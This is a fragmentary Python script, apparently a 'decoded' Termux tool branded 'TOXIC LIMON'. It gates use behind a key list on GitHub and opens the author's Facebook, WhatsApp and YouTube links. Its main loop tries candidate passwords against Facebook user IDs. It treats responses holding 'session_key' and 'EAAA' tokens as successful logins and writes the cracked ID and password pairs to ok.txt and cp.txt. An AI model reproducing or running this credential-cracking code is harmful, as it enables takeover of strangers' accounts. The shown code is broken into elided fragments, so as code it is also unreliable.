# Decoder By MOHAMMAD LIMON  👑
# Decode file /- ML LIMON PYC 3.11
# DECODE FILE VERSION - V.3.1.1
# WHATSAPP - +8801307256075
import os
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (★MOHAMMAD LIMON★) ")
time.sleep(5)
...
`7MMF'      `7MMF'`7MMM.     ,MMF' .g8""8q. `7MN.   `7MF'    
  MM          MM    MMMb    dPMM .dP'    `YM. MMN.    M      
  MM          MM    M YM   ,M MM dM'      `MM M YMb   M      
  MM          MM    M  Mb  M' MM MM        MM M  `MN. M      
  MM      ,   MM    M  YM.P'  MM MM.      ,MP M   `MM.M      
  MM     ,M   MM    M  `YM'   MM `Mb.    ,dP' M     YMM      
.JMMmmmmMMM .JMML..JML. `'  .JMML. `"bmmd"' .JML.    YM      
                                                 
                                                 
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m TOXIC LIMON / MOHAMMAD LIMON\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : TOXIC LIMON \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : +8801307256075 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/MOHAMMAD.LIMON.L \x1b[0m\x1b[1;97m]
════════════════════════════════════════════════════════💥
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://youtube.com/channel/UCdxAY_EP6u-kx1Q0UmFMRTg"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/MOHAMMAD.LIMON.L")
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/MOHAMMAD.LIMON.L")
	runtxt("\033[0;97m THIS YOUR KEY COPY TO 👉 >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m AUTOMATIC OPEN OWNER ID JUST SMS TO YOUR KEY")
	os.system("xdg-open https://www.facebook.com/MOHAMMAD.LIMON.L")
	subprocess.check_output(["am", "start", "https://github.com/limonm2005/MR-LIMON/blob/main/Approved.txt"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/limonm2005/MR-LIMON/blob/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
...
═══════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m TOXIC LIMON\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : TOXIC LIMON \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : +8801307256075 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/MOHAMMAD.LIMON.L \x1b[0m\x1b[1;97m]
═══════════════════════════════════💥
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m CONTACT ME ON FAST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://wa.me/+8801307256075"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=LIMON=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=LIMON=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=LIMON=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=LIMON=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    : TOXIC LIMON / MOHAMMAD LIMON ")
		print(" [*] Team      :  IT'z-LIMON\n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/MOHAMMAD.LIMON.L ")
		print(" [*] WhatsApp : +8801307256075 ")
		print(" [*] YouTube   : https://youtube.com/channel/UCdxAY_EP6u-kx1Q0UmFMRTg ")
